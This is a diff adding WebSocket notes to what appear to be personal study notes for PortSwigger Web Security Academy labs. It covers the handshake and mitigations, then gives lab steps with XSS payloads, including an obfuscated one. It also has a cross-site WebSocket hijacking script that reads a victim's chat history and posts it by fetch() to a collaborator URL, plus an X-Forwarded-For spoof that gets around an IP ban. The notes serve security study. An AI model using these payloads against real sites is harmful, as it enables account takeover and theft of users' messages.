@@ -1598,10 +1598,82 @@ CONNECT
     https://0a4d00e204437cd0804f0d9c00b7004e.web-security-academy.net/forgot-password?passwordResetToken=[YOUR TOKEN]
     
 ## WebSockets
-Details about WebSockets...
+- WebSocket connections are initiated over HTTP and are typically long-lived. essages can be sent in either direction at any time and are not transactional in nature.
+- `var ws = new WebSocket("wss://normal-website.com/chat");`
+- Browser issues a WebSocket handshake
+  ```
+  GET /chat HTTP/1.1
+  Host: normal-website.com
+  Sec-WebSocket-Version: 13
+  Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
+  Connection: keep-alive, Upgrade
+  Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
+  Upgrade: websocket
+  ```
+- Srver accepts the connection, it returns a WebSocket handshake
+  ```
+  HTTP/1.1 101 Switching Protocols
+  Connection: Upgrade
+  Upgrade: websocket
+  Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
+  ```
+- At this point, the network connection remains open and can be used to send WebSocket messages in either direction.
+- The `Connection` and `Upgrade` headers in the request and response indicate that this is a WebSocket handshake.
+- The `Sec-WebSocket-Version` request header specifies the WebSocket protocol version that the client wishes to use. This is typically 13.
+- The `Sec-WebSocket-Key` request header contains a Base64-encoded random value, which should be randomly generated in each handshake request.
+- The `Sec-WebSocket-Accept` response header contains a hash of the value submitted in the Sec-WebSocket-Key request header, concatenated with a specific string defined in the protocol specification. This is done to prevent misleading responses resulting from misconfigured servers or caching proxies.
+- A simple message could be sent from the browser using client-side JavaScript `ws.send("Peter Wiener");`   
+
+**Manipulating WebSocket traffic**
+- Intercept and modify WebSocket messages
+- Insecure WebSocket Implementations
+  - Lack of Authentication and Authorization (WebSocket server does not authenticate/authorize user)   
+  - Cross-Site WebSocket Hijacking (attacker create a WebSocket connection from a different origin)
+  - Message injection and reflection
+- Replay and generate new WebSocket messages
+- Manipulate WebSocket connections
+
+**Mitigation and Best Practices**
+- use wss:// protocol (WebSockets over TLS)
+- Hard code the URL of the WebSockets endpoint, and certainly don't incorporate user-controllable data into this URL
+- Protect the WebSocket handshake message against CSRF
+- Treat data received via the WebSocket as untrusted in both directions. Prevent input-based vulnerabilities such as SQL injection and cross-site scripting
+- Implement Proper Authentication and Authorization: Ensure that only authorized users can access specific WebSocket channels   
+- Rate Limiting and Session Management   
 
 ### WebSockets Lab
-
+- **Manipulating WebSocket messages** to exploit vulnerabilities
+  - Trigger XSS in a modified WebSocket message
+  - live chat send a message
+  - In Burp Proxy, go to the WebSockets history (if it is empty, refresh the browser)
+  - The  WebSocket message has been HTML-encoded by the client before sending
+  - Intercept on when seding a new chat message or send to repater for the selected websocket message
+    `<img src=1 onerror='alert(1)'>`
+- Cross-site WebSocket hijacking (**CSWSH**)   
+  - cross-site WebSocket hijacking attack to exfiltrate the victim's chat history, then use this gain access to their account.
+  - Read chat history in collaborator Poll   
+  - Identify the WebSocket url in Proxy WebSockets history `https://0a56008203bf93638207754f00ed00b3.web-security-academy.net/chat`
+  - Copy Collaborator
+  - Craft payload and deliver to victim
+    ```
+    <script>
+       var ws = new WebSocket('wss://your-websocket-url');
+       ws.onopen = function() {
+           ws.send("READY");
+       };
+       ws.onmessage = function(event) {
+           fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
+       };
+   </script>
+    ```
+   - Poll now > read the http history > found credential in chat history   
+- **Manipulating the WebSocket handshake** to exploit vulnerabilities
+  - **XSS has been blocked** and that your WebSocket connection has been terminated
+  - Click "**Reconnect**", onnection attempt fails because your IP address has been banned.
+  - Add '**X-Forwarded-For: 1.1.1.1**' header to the handshake request to spoof your IP address
+  - Click "**Connect**" to successfully reconnect the WebSocket
+  - Send a WebSocket message containing an obfuscated XSS payload `<img src=1 oNeRrOr=alert`1`>`   
+   
 ## CSRF (Cross-Site Request Forgery)
 **CSRF requirements**
 - Privileged action
